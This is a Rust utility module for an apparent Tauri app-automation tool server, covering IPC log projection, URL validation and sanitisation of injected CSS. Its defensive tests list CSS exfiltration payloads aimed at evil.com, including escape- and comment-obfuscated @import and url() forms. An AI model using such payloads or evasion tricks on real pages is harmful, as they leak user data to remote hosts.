use rmcp::model::{CallToolResult, Content};

/// Produce a properly escaped JavaScript string literal (with double quotes).
///
/// Non-ASCII characters are escaped to `\uXXXX` sequences to avoid corruption
/// in Tauri's `WebView2` eval pipeline on Windows, which mangles raw UTF-8 bytes.
pub fn js_string(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for ch in s.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            '\0' => out.push_str("\\u0000"),
            c if c.is_ascii_graphic() || c == ' ' => out.push(c),
            c => {
                for unit in c.encode_utf16(&mut [0; 2]) {
                    use std::fmt::Write;
                    let _ = write!(out, "\\u{unit:04x}");
                }
            }
        }
    }
    out.push('"');
    out
}

/// JavaScript-style truthiness for a JSON value.
///
/// Mirrors what `if (value)` would do in the webview after `eval_js`: `false`,
/// `null`, `0`, `NaN`, `""`, and (pragmatically) empty arrays/objects are falsy;
/// everything else is truthy. Used by `wait_for` with the `expression` condition.
#[must_use]
pub fn json_truthy(value: &serde_json::Value) -> bool {
    match value {
        serde_json::Value::Null => false,
        serde_json::Value::Bool(b) => *b,
        serde_json::Value::Number(n) => n.as_f64().is_some_and(|f| f != 0.0 && !f.is_nan()),
        serde_json::Value::String(s) => !s.is_empty(),
        serde_json::Value::Array(a) => !a.is_empty(),
        serde_json::Value::Object(o) => !o.is_empty(),
    }
}

/// Build the JS that projects the webview IPC log down to just command names for
/// `detect_ghost_commands`.
///
/// When `since_ms` is `Some(ms)` with `ms > 0`, only commands invoked within the
/// last `ms` milliseconds are included. This is a **non-destructive** way to scope
/// ghost detection to the current test's traffic — the alternative,
/// `logs {action:'clear'}`, wipes the session-persistent IPC ring buffer for every
/// other reader. The cutoff is evaluated in the webview's own clock (`Date.now()`),
/// so there is no Rust↔JS clock skew. A non-positive or absent `since_ms` projects
/// the whole accumulated log (the historical behavior).
#[must_use]
pub fn ghost_ipc_projection_js(since_ms: Option<i64>) -> String {
    let filter = match since_ms {
        Some(ms) if ms > 0 => format!(
            ".filter(function(c){{ return c && c.timestamp && c.timestamp >= (Date.now() - {ms}); }})"
        ),
        _ => String::new(),
    };
    format!(
        "return (window.__VICTAURI__?.getIpcLog() || []){filter}\
         .map(function(c){{ return (c && c.command) || null; }})\
         .filter(function(x){{ return x; }})"
    )
}

/// Wrap a [`GhostCommandReport`] with an honesty signal so an agent never reads a
/// raw `frontend_only` list as a bug list.
///
/// `frontend_only` is "invoked but absent from Victauri's *introspection registry*"
/// — which is a true ghost (missing-handler bug) ONLY when that registry mirrors the
/// app's full `generate_handler!` set. Most apps register a subset (or nothing) via
/// `#[inspectable]`/`register_command_names`, so without this signal the list is
/// dominated by perfectly real, merely-uninstrumented commands. This is the exact
/// false-positive that flagged 4DA's `set_language` (a real, registered command) as
/// a ghost. The returned envelope is purely additive: it preserves the original
/// report fields and adds `reliability` + a plain-language `note` an agent must read
/// before treating `frontend_only` as a bug list.
///
/// [`GhostCommandReport`]: victauri_core::GhostCommandReport
#[must_use]
pub fn annotate_ghost_reliability(report: &victauri_core::GhostCommandReport) -> serde_json::Value {
    let registry = report.total_registry_commands;
    let fe_total = report.total_frontend_commands;
    let fe_only = report.frontend_only.len();
    let ratio = if fe_total > 0 {
        fe_only as f64 / fe_total as f64
    } else {
        0.0
    };

    let (reliability, note) = if registry == 0 {
        (
            "none",
            "The introspection registry is EMPTY, so every frontend command appears under \
             `frontend_only`. This is NOT a ghost-command bug list — it just means the app \
             does not use #[inspectable]/register_command_names. To make ghost detection \
             meaningful, register the app's commands; otherwise cross-check suspected ghosts \
             against the app's `tauri::generate_handler!` list directly (e.g. grep the Rust \
             source)."
                .to_string(),
        )
    } else if ratio > 0.5 {
        (
            "low",
            format!(
                "The registry knows {registry} command(s) but {fe_only} of {fe_total} frontend \
                 commands are absent from it. Most `frontend_only` entries are therefore most \
                 likely REAL commands that simply lack #[inspectable], not missing-handler \
                 bugs. Treat them as candidates only — confirm a true ghost by checking the \
                 app's `generate_handler!` list (a real ghost has no Rust handler at all)."
            ),
        )
    } else {
        (
            "high",
            "The registry covers most observed frontend traffic, so `frontend_only` entries are \
             likely genuine ghosts (invoked with no matching backend handler). Still worth a \
             quick source check before treating one as a bug."
                .to_string(),
        )
    };

    // Purely additive: the original report fields are preserved verbatim (no schema
    // break for existing consumers) and enriched with the honesty signal. `reliability`
    // + `note` are what an agent must read before treating `frontend_only` as bugs.
    serde_json::json!({
        "reliability": reliability,
        "note": note,
        "frontend_only": report.frontend_only,
        "registry_only": report.registry_only,
        "total_frontend_commands": report.total_frontend_commands,
        "total_registry_commands": report.total_registry_commands,
    })
}

/// Project the webview IPC log down to `{command, duration_ms}` pairs only — never
/// the request/response bodies.
///
/// The full `getIpcLog()` carries request args + response bodies; on a heavy-traffic
/// real app that easily exceeds the eval result cap, which silently returned an empty
/// string and made `coverage`/`command_timings` report **zero** real traffic even
/// while the app was making hundreds of calls. This minimal projection stays small.
/// `since_ms` time-windows like [`ghost_ipc_projection_js`].
#[must_use]
pub fn ipc_timing_projection_js(since_ms: Option<i64>) -> String {
    let filter = match since_ms {
        Some(ms) if ms > 0 => format!(
            ".filter(function(c){{ return c && c.timestamp && c.timestamp >= (Date.now() - {ms}); }})"
        ),
        _ => String::new(),
    };
    format!(
        "return (window.__VICTAURI__?.getIpcLog() || []){filter}\
         .map(function(c){{ return (c && c.command) ? {{ command: c.command, \
         duration_ms: (typeof c.duration_ms === 'number' ? c.duration_ms : null) }} : null; }})\
         .filter(function(x){{ return x; }})"
    )
}

/// Compute per-command latency stats (count / min / max / avg / p95 ms) from raw IPC
/// `{command, duration_ms}` entries produced by [`ipc_timing_projection_js`].
///
/// Pending calls (null `duration_ms`) count toward `call_count` but not the latency
/// figures (`timed_samples` reports how many had a measured duration). Output is
/// sorted by `call_count` descending. This turns the live IPC log into a real
/// profile of the app's own frontend traffic — the data `command_timings` was blind
/// to because its counter only sees Victauri-driven `invoke_command` calls.
#[must_use]
pub fn ipc_timing_stats(entries: &[serde_json::Value]) -> Vec<serde_json::Value> {
    use std::collections::BTreeMap;
    let mut counts: BTreeMap<String, usize> = BTreeMap::new();
    let mut durations: BTreeMap<String, Vec<f64>> = BTreeMap::new();
    for e in entries {
        let Some(cmd) = e.get("command").and_then(|c| c.as_str()) else {
            continue;
        };
        *counts.entry(cmd.to_string()).or_default() += 1;
        if let Some(d) = e.get("duration_ms").and_then(serde_json::Value::as_f64) {
            durations.entry(cmd.to_string()).or_default().push(d);
        }
    }

    let mut out: Vec<serde_json::Value> = counts
        .into_iter()
        .map(|(cmd, call_count)| {
            let mut durs = durations.remove(&cmd).unwrap_or_default();
            durs.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
            let n = durs.len();
            let (min, max, avg, p95) = if n == 0 {
                (None, None, None, None)
            } else {
                let sum: f64 = durs.iter().sum();
                let p95_idx = (((n as f64) * 0.95).ceil() as usize)
                    .saturating_sub(1)
                    .min(n - 1);
                let round1 = |v: f64| (v * 10.0).round() / 10.0;
                (
                    Some(round1(durs[0])),
                    Some(round1(durs[n - 1])),
                    Some(round1(sum / n as f64)),
                    Some(round1(durs[p95_idx])),
                )
            };
            serde_json::json!({
                "command": cmd,
                "call_count": call_count,
                "timed_samples": n,
                "min_ms": min,
                "max_ms": max,
                "avg_ms": avg,
                "p95_ms": p95,
            })
        })
        .collect();

    out.sort_by(|a, b| {
        b.get("call_count")
            .and_then(serde_json::Value::as_u64)
            .cmp(&a.get("call_count").and_then(serde_json::Value::as_u64))
    });
    out
}

pub fn json_result(value: &impl serde::Serialize) -> CallToolResult {
    match serde_json::to_string_pretty(value) {
        Ok(json) => CallToolResult::success(vec![Content::text(json)]),
        Err(e) => tool_error(e.to_string()),
    }
}

pub fn tool_error(msg: impl Into<String>) -> CallToolResult {
    let mut result = CallToolResult::success(vec![Content::text(msg)]);
    result.is_error = Some(true);
    result
}

pub fn tool_disabled(name: &str) -> CallToolResult {
    tool_error_with_hint(
        format!("tool '{name}' is disabled by privacy configuration"),
        RecoveryHint::ReportToUser,
    )
}

#[derive(Debug, Clone, Copy)]
pub enum RecoveryHint {
    CheckInput,
    ReportToUser,
}

impl RecoveryHint {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::CheckInput => "CHECK_INPUT",
            Self::ReportToUser => "REPORT_TO_USER",
        }
    }
}

pub fn tool_error_with_hint(msg: impl Into<String>, hint: RecoveryHint) -> CallToolResult {
    let message = msg.into();
    let text = format!(
        "{message}

[hint: {}]",
        hint.as_str()
    );
    let mut result = CallToolResult::success(vec![Content::text(text)]);
    result.is_error = Some(true);
    result
}

pub fn missing_param(param: &str, action: &str) -> CallToolResult {
    tool_error_with_hint(
        format!("missing required parameter '{param}' for action '{action}'"),
        RecoveryHint::CheckInput,
    )
}

/// Validate a URL for navigation.
///
/// Only `http` and `https` schemes are allowed by default. The `file` scheme
/// is blocked unless `allow_file` is `true` (opt-in via
/// [`VictauriBuilder::allow_file_navigation`](crate::VictauriBuilder::allow_file_navigation)).
pub fn validate_url(url: &str, allow_file: bool) -> Result<(), String> {
    let trimmed: String = url.chars().filter(|c| !c.is_control()).collect();
    match url::Url::parse(&trimmed) {
        Ok(parsed) => match parsed.scheme() {
            "http" | "https" => Ok(()),
            "file" if allow_file => Ok(()),
            "file" => Err("scheme 'file' is not allowed by default; enable with \
                 VictauriBuilder::allow_file_navigation()"
                .to_string()),
            scheme => Err(format!(
                "scheme '{scheme}' is not allowed; use http or https"
            )),
        },
        Err(e) => Err(format!("invalid URL: {e}")),
    }
}

pub fn sanitize_css_color(color: &str) -> Result<String, String> {
    let s = color.trim();
    if s.len() > 100 {
        return Err("CSS color value too long".to_string());
    }
    // Reject CSS escape sequences (\XX hex escapes)
    if s.contains('\\') {
        return Err("CSS escape sequences not allowed in color values".to_string());
    }
    let valid = s
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, '#' | '(' | ')' | ',' | '.' | ' ' | '%' | '-'));
    if !valid {
        return Err("invalid characters in CSS color value".to_string());
    }
    let lower = s.to_lowercase();
    if lower.contains("url(") || lower.contains("expression(") {
        return Err("invalid CSS color value".to_string());
    }
    Ok(s.to_string())
}

/// Strip CSS `/* ... */` comments so a scan cannot be evaded by hiding `@import`/`url(`
/// inside a comment that the browser's CSS parser ignores.
fn strip_css_comments(css: &str) -> String {
    let bytes = css.as_bytes();
    let mut out = String::with_capacity(css.len());
    let mut i = 0;
    while i < bytes.len() {
        if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'*' {
            i += 2;
            while i + 1 < bytes.len() && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
                i += 1;
            }
            i = (i + 2).min(bytes.len());
        } else {
            out.push(bytes[i] as char);
            i += 1;
        }
    }
    out
}

/// Decode CSS escape sequences so an obfuscated `\40 import` / `\75 rl(` / `\2f\2f`
/// can't slip past a literal-string scan that the browser's CSS parser would still
/// decode and act on. Handles the two CSS escape forms: `\` + 1–6 hex digits
/// (optionally followed by one whitespace) → that code point, and `\` + any other
/// char → that char literally. A trailing lone `\` is dropped.
fn decode_css_escapes(css: &str) -> String {
    let mut out = String::with_capacity(css.len());
    let mut chars = css.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        // Collect up to 6 hex digits.
        let mut hex = String::new();
        while hex.len() < 6 && chars.peek().is_some_and(char::is_ascii_hexdigit) {
            hex.push(chars.next().unwrap());
        }
        if hex.is_empty() {
            // `\` + non-hex → literal next char (e.g. `\@` → `@`); lone `\` dropped.
            if let Some(next) = chars.next() {
                out.push(next);
            }
        } else {
            // One optional trailing whitespace terminates a hex escape.
            if chars.peek().is_some_and(char::is_ascii_whitespace) {
                chars.next();
            }
            match u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                Some(decoded) => out.push(decoded),
                None => out.push('\u{FFFD}'),
            }
        }
    }
    out
}

/// Validate CSS submitted to `css inject` before it is added to the page. By default this
/// rejects two remote-fetch vectors that turn a debugging tool into a data-exfiltration /
/// `SSRF` channel (especially dangerous when chained with prompt injection from page-sourced
/// content): `@import` (pulls a remote stylesheet) and `url(...)` pointing at a remote
/// origin (`http(s)://`, protocol-relative `//host`, or any `scheme://`). Relative refs,
/// `data:` URIs, and `#fragment` refs are allowed. Set `allow_remote` to opt back in to
/// remote references when intentionally needed.
///
/// # Errors
/// Returns an error describing the rejected construct (or oversize input).
pub fn sanitize_injected_css(css: &str, allow_remote: bool) -> Result<(), String> {
    const MAX_CSS_LEN: usize = 256 * 1024;
    if css.len() > MAX_CSS_LEN {
        return Err(format!(
            "injected CSS too large ({} bytes, limit {MAX_CSS_LEN})",
            css.len()
        ));
    }
    if allow_remote {
        return Ok(());
    }
    // Strip comments, then DECODE escapes, then lowercase — so `\40 import` and
    // `\75 rl(` (and an escaped `\2f\2f` remote URL) are normalized to the forms
    // the scan below matches, closing the CSS-escape bypass.
    let scan = decode_css_escapes(&strip_css_comments(css)).to_ascii_lowercase();
    if scan.contains("@import") {
        return Err(
            "`@import` is blocked in injected CSS (it fetches a remote stylesheet — \
                    a data-exfiltration vector). Inline the rules, or pass `allow_remote: true`."
                .to_string(),
        );
    }
    // Inspect every `url(...)` argument for a remote target.
    let bytes = scan.as_bytes();
    let mut search_from = 0;
    while let Some(rel) = scan[search_from..].find("url(") {
        let arg_start = search_from + rel + 4;
        let arg_end = scan[arg_start..]
            .find(')')
            .map_or(scan.len(), |e| arg_start + e);
        let arg = bytes[arg_start..arg_end]
            .iter()
            .map(|&b| b as char)
            .collect::<String>();
        let trimmed = arg.trim().trim_matches(['\'', '"']).trim();
        if trimmed.starts_with("//") || trimmed.contains("://") {
            return Err(format!(
                "remote `url(...)` is blocked in injected CSS (`{}` would fetch a remote \
                 origin — a data-exfiltration vector). Use a relative or data: URL, or pass \
                 `allow_remote: true`.",
                trimmed.chars().take(80).collect::<String>()
            ));
        }
        search_from = arg_end;
    }
    Ok(())
}

#[cfg(test)]
mod json_truthy_tests {
    use super::json_truthy;
    use serde_json::json;

    #[test]
    fn falsy_values() {
        assert!(!json_truthy(&json!(null)));
        assert!(!json_truthy(&json!(false)));
        assert!(!json_truthy(&json!(0)));
        assert!(!json_truthy(&json!(0.0)));
        assert!(!json_truthy(&json!("")));
        assert!(!json_truthy(&json!([])));
        assert!(!json_truthy(&json!({})));
    }

    #[test]
    fn truthy_values() {
        assert!(json_truthy(&json!(true)));
        assert!(json_truthy(&json!(1)));
        assert!(json_truthy(&json!(-1)));
        assert!(json_truthy(&json!("ready")));
        assert!(json_truthy(&json!([1])));
        assert!(json_truthy(&json!({ "k": "v" })));
    }
}

#[cfg(test)]
mod ghost_projection_tests {
    use super::ghost_ipc_projection_js;

    #[test]
    fn projects_whole_log_when_since_absent() {
        let js = ghost_ipc_projection_js(None);
        assert!(js.contains("getIpcLog()"));
        assert!(js.contains(".map("));
        // No time window applied.
        assert!(!js.contains("Date.now()"));
        assert!(!js.contains("c.timestamp"));
    }

    #[test]
    fn applies_window_when_since_positive() {
        let js = ghost_ipc_projection_js(Some(5000));
        assert!(js.contains("c.timestamp"));
        assert!(js.contains("Date.now() - 5000"));
        // Window is applied before the name projection.
        let win = js.find("Date.now()").unwrap();
        let map = js.find(".map(").unwrap();
        assert!(win < map, "time filter must run before the name map");
    }

    #[test]
    fn ignores_nonpositive_since() {
        assert!(!ghost_ipc_projection_js(Some(0)).contains("Date.now()"));
        assert!(!ghost_ipc_projection_js(Some(-10)).contains("Date.now()"));
    }
}

#[cfg(test)]
mod injected_css_tests {
    use super::sanitize_injected_css;

    #[test]
    fn blocks_at_import() {
        assert!(sanitize_injected_css("@import url(https://evil.com/x.css);", false).is_err());
        // Even hidden behind a comment.
        assert!(sanitize_injected_css("/* x */@import 'https://evil.com';", false).is_err());
        // Comment-splitting obfuscation is caught because comments are stripped first:
        // `@imp/* */ort` collapses to `@import`.
        assert!(sanitize_injected_css("@imp/* */ort url(//evil.com)", false).is_err());
    }

    #[test]
    fn blocks_remote_url() {
        assert!(
            sanitize_injected_css("body{background:url(https://evil.com/x?d=1)}", false).is_err()
        );
        assert!(sanitize_injected_css("body{background:url('//evil.com/x')}", false).is_err());
        assert!(sanitize_injected_css("a{cursor:url(ftp://evil.com/c)}", false).is_err());
    }

    #[test]
    fn allows_local_and_data() {
        assert!(sanitize_injected_css("body{color:red}", false).is_ok());
        assert!(sanitize_injected_css("body{background:url('/assets/x.png')}", false).is_ok());
        assert!(sanitize_injected_css("body{background:url(#grad)}", false).is_ok());
        assert!(
            sanitize_injected_css("body{background:url(data:image/png;base64,AAAA)}", false)
                .is_ok()
        );
    }

    #[test]
    fn allow_remote_opts_back_in() {
        assert!(sanitize_injected_css("@import url(https://fonts.example/x.css);", true).is_ok());
        assert!(
            sanitize_injected_css("body{background:url(https://cdn.example/x.png)}", true).is_ok()
        );
    }

    #[test]
    fn blocks_css_escape_obfuscated_import() {
        // `\40 import` decodes to `@import`; `\100 6d port` style hex escapes too.
        assert!(sanitize_injected_css("\\40 import url(https://evil.com/x.css);", false).is_err());
        assert!(sanitize_injected_css("\\000040import 'https://evil.com';", false).is_err());
        // `\@import` (backslash + literal char) also normalizes to `@import`.
        assert!(sanitize_injected_css("\\@import url(//evil.com)", false).is_err());
    }

    #[test]
    fn blocks_css_escape_obfuscated_remote_url() {
        // `\75 rl(` decodes to `url(` (hex escape + space-terminator).
        assert!(
            sanitize_injected_css("body{background:\\75 rl(https://evil.com/x)}", false).is_err()
        );
        // Escaped protocol-relative `//` via unambiguous 6-digit escapes (matches CSS
        // greedy hex parsing: `\2f` followed by a hex char would eat it, so a real
        // attacker uses the 6-digit or space-terminated form).
        assert!(
            sanitize_injected_css("body{background:url(\\00002f\\00002fevil.com/x)}", false)
                .is_err()
        );
    }

    #[test]
    fn escape_decoding_preserves_legitimate_css() {
        // A legitimately-escaped local content value must still pass.
        assert!(sanitize_injected_css("a::before{content:'\\2022'}", false).is_ok());
        assert!(sanitize_injected_css("body{color:red}", false).is_ok());
    }
}

#[cfg(test)]
mod ipc_timing_tests {
    use super::{ipc_timing_projection_js, ipc_timing_stats};
    use serde_json::json;

    #[test]
    fn projection_is_body_free() {
        let js = ipc_timing_projection_js(None);
        // Only command + duration are projected — never request/response bodies, so
        // the result stays under the eval cap on busy apps (the bug that made the old
        // full-getIpcLog coverage path return zero).
        assert!(js.contains("c.command"));
        assert!(js.contains("duration_ms"));
        assert!(!js.contains("result"));
        assert!(!js.contains("args"));
        assert!(!js.contains("Date.now()"));
        assert!(ipc_timing_projection_js(Some(5000)).contains("Date.now() - 5000"));
    }

    #[test]
    fn stats_aggregate_per_command_with_percentiles() {
        let entries = vec![
            json!({ "command": "get_settings", "duration_ms": 10.0 }),
            json!({ "command": "get_settings", "duration_ms": 30.0 }),
            json!({ "command": "get_settings", "duration_ms": 20.0 }),
            json!({ "command": "save", "duration_ms": 5.0 }),
        ];
        let stats = ipc_timing_stats(&entries);
        assert_eq!(stats.len(), 2);
        // Sorted by call_count desc — get_settings (3) first.
        assert_eq!(stats[0]["command"], "get_settings");
        assert_eq!(stats[0]["call_count"], 3);
        assert_eq!(stats[0]["timed_samples"], 3);
        assert_eq!(stats[0]["min_ms"], 10.0);
        assert_eq!(stats[0]["max_ms"], 30.0);
        assert_eq!(stats[0]["avg_ms"], 20.0);
        assert_eq!(stats[1]["command"], "save");
        assert_eq!(stats[1]["call_count"], 1);
    }

    #[test]
    fn pending_calls_count_but_do_not_skew_latency() {
        let entries = vec![
            json!({ "command": "run_pipeline", "duration_ms": null }),
            json!({ "command": "run_pipeline", "duration_ms": 100.0 }),
        ];
        let stats = ipc_timing_stats(&entries);
        assert_eq!(stats[0]["call_count"], 2);
        assert_eq!(stats[0]["timed_samples"], 1);
        assert_eq!(stats[0]["avg_ms"], 100.0);
    }

    #[test]
    fn empty_input_yields_empty_stats() {
        assert!(ipc_timing_stats(&[]).is_empty());
    }
}

#[cfg(test)]
mod ghost_reliability_tests {
    use super::annotate_ghost_reliability;
    use victauri_core::{GhostCommand, GhostCommandReport, GhostSource};

    fn fe(name: &str) -> GhostCommand {
        GhostCommand {
            name: name.to_string(),
            source: GhostSource::FrontendOnly,
            description: None,
        }
    }

    #[test]
    fn empty_registry_is_unreliable() {
        // 4DA's exact scenario: a real registered command (set_language) shows up as
        // frontend_only purely because the app uses no #[inspectable] registry.
        let report = GhostCommandReport {
            frontend_only: vec![fe("set_language")],
            registry_only: vec![],
            total_frontend_commands: 1,
            total_registry_commands: 0,
        };
        let v = annotate_ghost_reliability(&report);
        assert_eq!(v["reliability"], "none");
        assert!(v["note"].as_str().unwrap().contains("EMPTY"));
        // The original field is preserved; the honesty lives in reliability + note.
        assert_eq!(v["frontend_only"][0]["name"], "set_language");
    }

    #[test]
    fn sparse_registry_is_low_confidence() {
        let report = GhostCommandReport {
            frontend_only: vec![fe("a"), fe("b"), fe("c")],
            registry_only: vec![],
            total_frontend_commands: 4,
            total_registry_commands: 2,
        };
        let v = annotate_ghost_reliability(&report);
        assert_eq!(v["reliability"], "low");
    }

    #[test]
    fn complete_registry_is_high_confidence() {
        let report = GhostCommandReport {
            frontend_only: vec![fe("typo_cmd")],
            registry_only: vec![],
            total_frontend_commands: 20,
            total_registry_commands: 50,
        };
        let v = annotate_ghost_reliability(&report);
        assert_eq!(v["reliability"], "high");
    }
}
